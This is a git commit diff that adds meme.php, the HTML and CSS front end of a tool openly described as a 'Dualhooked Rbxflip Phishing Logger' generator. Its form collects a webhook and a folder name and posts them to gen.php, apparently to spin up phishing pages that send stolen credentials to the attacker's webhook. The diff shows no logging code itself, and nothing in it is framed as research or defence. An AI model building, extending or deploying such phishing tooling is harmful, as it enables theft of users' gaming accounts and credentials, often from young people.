edd00b194d1831f7df16ecffe0ae0bf23af29eb4
veiyo <83894171+veiyolol@users.noreply.github.com>
2021-11-17 16:44:11 -0800

    Create meme.php

---
+++ meme.php
@@ -0,0 +1,154 @@
+<html>
+    <meta property="og:title" content="Meme Gen">
+    <meta property="og:site_name" content="Meme DH Phishing Generator">
+	<meta property="og:description" content="Create your own Dualhooked Rbxflip  Phishing Logger!">
+	<meta data-n-head="1" name="og:image" content="/images/doge.jpeg">
+	<meta charset="UTF-8" />
+	<title>Meme DH Logger Generator</title>
+</html>
+
+<style>
+    html {
+  scroll-behavior: smooth;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  background-image: url("https://th.bing.com/th/id/R28da09fb4db3055bdd6c6705d5198084?rik=ErfCBJaL7Ya7cA&pid=ImgRaw"); /* fallback for old browsers */
+
+  height: 100%;
+    background-repeat: no-repeat;
+      background-size: 100% 95%;
+
+  /* code to make all text unselectable */
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  -o-user-select: none;
+  user-select: none;
+}
+
+/* Disables selector ring */
+body:not(.user-is-tabbing) button:focus,
+body:not(.user-is-tabbing) input:focus,
+body:not(.user-is-tabbing) select:focus,
+body:not(.user-is-tabbing) textarea:focus {
+  outline: none;
+}
+
+/* ########################################################## */
+
+h1 {
+  color: white;
+
+  font-size: 35px;
+  font-weight: 800;
+}
+
+.flex-container {
+  width: 100vw;
+
+  margin-top: 60px;
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.content-container {
+  width: 500px;
+  height: 350px;
+}
+
+.form-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  width: 500px;
+  height: 350px;
+
+  margin-top: 5px;
+  padding-top: 20px;
+
+  border-radius: 12px;
+
+  display: flex;
+  justify-content: center;
+  flex-direction: column;
+
+  background: #1f1f1f;
+  box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.199);
+}
+
+.subtitle {
+  font-size: 11px;
+
+  color: rgba(177, 177, 177, 0.3);
+}
+
+input {
+  border: none;
+  border-bottom: solid rgb(143, 143, 143) 1px;
+
+  margin-bottom: 30px;
+
+  background: none;
+  color: rgba(255, 255, 255, 0.555);
+
+  height: 35px;
+  width: 300px;
+}
+
+.submit-btn {
+  cursor: pointer;
+
+  border: none;
+  border-radius: 8px;
+
+  box-shadow: 2px 2px 7px #38d39f70;
+
+  background: #38d39f;
+  color: rgba(255, 255, 255, 0.8);
+
+  width: 80px;
+
+  transition: all 1s;
+}
+
+.submit-btn:hover {
+  color: rgb(255, 255, 255);
+
+  box-shadow: none;
+}
+
+</style>
+<div class="flex-container">
+    <div class="content-container">
+      <div class="form-container">
+        <form method="POST" action="gen.php">
+          <h1>
+            Meme RbxFlip Logger
+          </h1>
+          <br>
+          <br>
+          <span class="subtitle">Webhook:</span>
+          <br>
+          <input type="password" name="webhook" value="">
+          <br>
+          <span class="subtitle">Directory Name:</span>
+          <br>
+          <input type="text" name="folder" value="">
+          <br><br>
+          <input type="submit" value="SUBMIT" class="submit-btn">
+        </form>
+      </div>
+    </div>
+  </div>
